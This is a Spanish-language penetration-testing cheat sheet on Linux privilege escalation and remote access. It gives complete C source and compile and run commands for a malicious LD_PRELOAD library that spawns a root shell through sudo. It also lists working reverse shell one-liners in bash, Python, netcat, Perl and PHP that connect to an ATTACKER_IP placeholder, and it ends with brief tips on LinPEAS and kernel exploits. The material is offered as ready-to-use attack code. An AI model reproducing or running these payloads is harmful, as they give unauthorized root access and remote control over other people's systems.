LD_PRELOAD / LD_LIBRARY
4CRÍTICO▾
Si sudo preserva LD_PRELOAD (env_keep), puedes cargar una librería maliciosa al ejecutar cualquier binario con sudo.
sudo -l | grep LD_PRELOAD
Verificar si LD_PRELOAD está en env_keep
/* shell.c */ #include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init() { unsetenv("LD_PRELOAD"); setuid(0); setgid(0); system("/bin/bash"); }
Librería maliciosa — compilar con gcc -shared -o /tmp/shell.so shell.c
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
Compilar la librería
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/cualquier-binario
Ejecutar con LD_PRELOAD → bash root

REVERSE SHELLS
⚠ Cambia ATTACKER_IP y PORT por tus valores antes de usar.
// BASH TCP
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
La más clásica. Funciona en casi cualquier bash moderno.
// BASH UDP
bash -i >& /dev/udp/ATTACKER_IP/4444 0>&1
Útil si TCP está bloqueado por firewall.
// PYTHON 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
Cuando bash no da reverse shell pero Python está disponible.
// NETCAT (con -e)
nc -e /bin/bash ATTACKER_IP 4444
Solo funciona con la versión tradicional de nc (no OpenBSD).
// NETCAT (sin -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
Para OpenBSD nc (la más común en sistemas modernos).
// PERL
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
Útil en servidores con Perl pero sin Python.
// PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
Para servidores web con PHP accesible desde CLI.

SEÑALES DE VULNERABILIDAD

✅ LinPEAS marca en rojo/amarillo los hallazgos críticos. Empezar por ahí.
⚡ Los exploits de kernel pueden crashear la máquina. Úsalos como último recurso en entornos productivos.
